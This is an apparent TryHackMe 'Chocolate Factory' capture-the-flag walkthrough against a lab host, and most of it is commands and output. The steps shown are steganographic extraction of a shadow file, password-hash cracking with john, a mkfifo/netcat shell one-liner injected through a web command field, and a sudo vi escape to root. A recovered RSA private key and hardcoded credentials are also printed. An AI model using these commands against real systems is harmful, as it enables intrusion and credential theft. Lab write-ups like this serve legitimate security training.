@@ -1,0 +1,323 @@
+So today we are going to solve another TryHackMe Challenge which is listed as an Easy One named ChocolateFactory.
+
+Main IP :: 10.49.171.147
+
+So we start with full port scan and there is a list of multiple open ports listed over with me.
+
+So we directly run service and port scan 
+
+root@ip-10-49-107-74:~# nmap 10.49.171.147 -p21,22,80,100-125 -sVC -vv
+
+Nmap scan report for ip-10-49-171-147.ap-south-1.compute.internal (10.49.171.147)
+Host is up, received reset ttl 64 (0.00017s latency).
+Scanned at 2026-05-19 03:24:41 UTC for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.49.107.74
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d4:29:02:34:47:83:19:ed:c7:a9:ac:24:ad:72:2b:09 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEgW9X3YDxVCqBSZqv3bUlUPgtgACsn7DIorJQ6YV6fb3BnSLxAvbL7xevzNfpz9x1Xj1YpGhy6jA91i9cYGN+P1Les+SMRWRdx5Vfop4xinDE6ATfnLYNuSTwf1utmvxG3mLOsvDsiB70rMMEqhg0uOsUhv/nZxqBUASPuw6rz4KiZ6okDqwtcMgvceNbZ0AKBDU2g1d9ZBFWaDpr2+eyBlnvr5AY4v1eHaRH6wQ7S+R5iM7R3PNA8ccvrhybjCVMSlUqbTE2dHsRdVKf2Ec5GB9/62IgxiIYZw27YUF277zDuP2KVyJMxWiVxkF2zd9xODfquKyqQbRlB3l231hskuj5uS1QSA369LpIQfC0f433I6bzz8K7UHH8/FblvzYiisDcJ3TAZTESzpSeSJB8h8OUsbtb1I8Pd3nQhc85zMfjmy0mmM7aJktejVYHbDcv5LIzAmu5Gl4WHEPRo8g4cC55raJx04cWc5Bwq/VFLyhirR3CfmG9qPs8EhYL8J8=
+|   256 ce:ef:d0:03:e3:1b:e2:8e:c1:39:b3:3e:f9:1c:d2:11 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDjdfSrWto1uCPaNy4RAe7TXD8Yvyr6zvJHEZ/0g7402yuK8muHvqsZCQWEMUo4qp4M1Y4deG1EH/TbWc36TFUw=
+|   256 a0:57:ca:7c:e1:d8:db:57:c9:0a:d1:86:5c:bc:96:28 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJUinNVXnY9j/fGs1t6HF+6rzxr8eadKh7+g95ZJRDL
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+And more we will do.
+
+So we saw that anonymous login is allowed in ftp so we get into the ftp server and get the .jpg image.
+
+0 Here comes the directory listing.
+drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
+drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
+-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+226 Directory send OK.
+
+I hope that there is something inside the image so ran exiftool and then steghide
+
+exiftool gum_room.jpg 
+ExifTool Version Number         : 12.76
+File Name                       : gum_room.jpg
+Directory                       : .
+File Size                       : 209 kB
+File Modification Date/Time     : 2020:09:30 14:31:12+00:00
+File Access Date/Time           : 2026:05:19 03:26:00+00:00
+File Inode Change Date/Time     : 2026:05:19 03:26:00+00:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Image Width                     : 1920
+Image Height                    : 1080
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 1920x1080
+Megapixels                      : 2.1
+
+and then steghide root@ip-10-49-107-74:~# steghide extract -sf gum_room.jpg -xf out.txt
+
+so there are multiple base64 kinda strings in out.txt
+
+ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
+KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
+OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
+Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
+d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
+Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
+Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
+LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
+OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
+Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
+OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
+OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
+ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
+YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
+CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
+CnRjcGR1bXA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
+CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
+dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
+aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
+aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
+aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
+LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
+Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
+OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
+OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
+OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
+Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
+OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
+OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
+L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
+T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==
+
+like this in form of base64 using cyberchef we get 
+
+daemon:*:18380:0:99999:7:::
+bin:*:18380:0:99999:7:::
+sys:*:18380:0:99999:7:::
+sync:*:18380:0:99999:7:::
+games:*:18380:0:99999:7:::
+man:*:18380:0:99999:7:::
+lp:*:18380:0:99999:7:::
+mail:*:18380:0:99999:7:::
+news:*:18380:0:99999:7:::
+uucp:*:18380:0:99999:7:::
+proxy:*:18380:0:99999:7:::
+www-data:*:18380:0:99999:7:::
+backup:*:18380:0:99999:7:::
+list:*:18380:0:99999:7:::
+irc:*:18380:0:99999:7:::
+gnats:*:18380:0:99999:7:::
+nobody:*:18380:0:99999:7:::
+systemd-timesync:*:18380:0:99999:7:::
+systemd-network:*:18380:0:99999:7:::
+systemd-resolve:*:18380:0:99999:7:::
+_apt:*:18380:0:99999:7:::
+mysql:!:18382:0:99999:7:::
+tss:*:18382:0:99999:7:::
+shellinabox:*:18382:0:99999:7:::
+strongswan:*:18382:0:99999:7:::
+ntp:*:18382:0:99999:7:::
+messagebus:*:18382:0:99999:7:::
+arpwatch:!:18382:0:99999:7:::
+Debian-exim:!:18382:0:99999:7:::
+uuidd:*:18382:0:99999:7:::
+debian-tor:*:18382:0:99999:7:::
+redsocks:!:18382:0:99999:7:::
+freerad:*:18382:0:99999:7:::
+iodine:*:18382:0:99999:7:::
+tcpdump:*:18382:0:99999:7:::
+miredo:*:18382:0:99999:7:::
+dnsmasq:*:18382:0:99999:7:::
+redis:*:18382:0:99999:7:::
+usbmux:*:18382:0:99999:7:::
+rtkit:*:18382:0:99999:7:::
+sshd:*:18382:0:99999:7:::
+postgres:*:18382:0:99999:7:::
+avahi:*:18382:0:99999:7:::
+stunnel4:!:18382:0:99999:7:::
+sslh:!:18382:0:99999:7:::
+nm-openvpn:*:18382:0:99999:7:::
+nm-openconnect:*:18382:0:99999:7:::
+pulse:*:18382:0:99999:7:::
+saned:*:18382:0:99999:7:::
+inetsim:*:18382:0:99999:7:::
+colord:*:18382:0:99999:7:::
+i2psvc:*:18382:0:99999:7:::
+dradis:*:18382:0:99999:7:::
+beef-xss:*:18382:0:99999:7:::
+geoclue:*:18382:0:99999:7:::
+lightdm:*:18382:0:99999:7:::
+king-phisher:*:18382:0:99999:7:::
+systemd-coredump:!!:18396::::::
+_rpc:*:18451:0:99999:7:::
+statd:*:18451:0:99999:7:::
+_gvm:*:18496:0:99999:7:::
+charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+
+nano charlie.hash
+root@ip-10-49-107-74:~# john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt charlie.hash
+
+we start to crack the password.
+
+
+nc 10.49.171.147 113
+http://localhost/key_rev_key <- You will find the key here!!!
+^C
+
+we start with this and get the key to find the key we use strings
+
+http://10.49.171.147/home.php
+
+so moving with this and there is thing to enter command and we use revshell to create a rev shell based command so continuing with it.
+
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 10.49.107.74 4444 > /tmp/f
+
+nc 10.49.171.147 9001
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+this is how we get the reverse shell.
+
+python
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+www-data@ip-10-49-171-147:/var/www/html$ ^Z
+[1]+  Stopped                 nc 10.49.171.147 9001
+root@ip-10-49-107-74:~/Downloads# stty raw -echo; fg
+nc 10.49.171.147 9001
+
+www-data@ip-10-49-171-147:/var/www/html$ export TERM=xterm
+www-data@ip-10-49-171-147:/var/www/html$ stty rows 24 columns 80   #our actual terminal size
+www-data@ip-10-49-171-147:/var/www/html$ 
+
+
+
+stabilized the current bogus shell.
+
+
+?>www-data@ip-10-49-171-147:/var/www/html$ cat validate.php 
+<?php
+	$uname=$_POST['uname'];
+	$password=$_POST['password'];
+	if($uname=="charlie" && $password=="cn7824"){
+		echo "<script>window.location='home.php'</script>";
+	}
+	else{
+		echo "<script>alert('Incorrect Credentials');</script>";
+		echo "<script>window.location='index.html'</script>";
+
+so reading this gives us Charlie password changing to Charlie.
+
+/home/charlie$ cat teleport
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
+FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
+82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
+37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
+ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
+Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
+Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
+G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
+-----END RSA PRIVATE KEY-----
+
+so we have this in teleport 
+a private key so let's go with it.
+
+-49-171-147:/$ whoami
+charlie
+charlie@ip-10-49-171-147:/$ cd /home/
+charlie@ip-10-49-171-147:/home$ cat us
+cat: us: No such file or directory
+charlie@ip-10-49-171-147:/home$ cd charlie/
+charlie@ip-10-49-171-147:/home/charlie$ cat user.txt 
+flag{cd5509042371b34e4826e4838b522d2e}
+
+PRIVILEDGE ESCALATION TIME
+
+sudo -l
+Matching Defaults entries for charlie on ip-10-49-171-147:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User charlie may run the following commands on ip-10-49-171-147:
+    (ALL : !root) NOPASSWD: /usr/bin/vi
+
+This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped.
+
+Remarks
+If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ....
+
+sudo vi -c ':!/bin/sh' /dev/null
+
+
+/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
+
+# 
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+: token must be bytes
+# cat root.py
+from cryptography.fernet import Fernet
+import pyfiglet
+key=input("Enter the key:  ")
+f=Fernet(key)
+encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
+display2=pyfiglet.figlet_format("Chocolate Factory ")
+print(display1)
+print(display2)
+print(mess)# 
+
+running this and entering key we get the root flag.
+
